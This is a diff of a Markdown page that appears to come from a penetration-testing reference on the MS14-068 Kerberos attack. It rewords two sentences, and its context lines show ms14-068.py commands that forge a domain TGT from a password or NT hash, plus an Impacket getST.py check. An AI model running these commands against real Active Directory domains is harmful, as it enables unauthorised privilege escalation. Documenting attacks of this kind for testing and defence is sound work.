@@ -166,6 +166,8 @@ connection.search(target_dn, "(samaccountname={})".format(username), attributes=
 print(connection.entries)
 ```
 
+A TGT can then be obtained with one of the following commands.
+
 ```bash
 # with a plaintext password
 ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
@@ -174,7 +176,7 @@ ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTR
 ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
 ```
 
-If the attack is successful, the script will write a `.ccache` ticket that will be usable with [pass-the-ticket](pass-the-ticket.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\).
+Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](pass-the-ticket.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\).
 
 ```bash
 getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
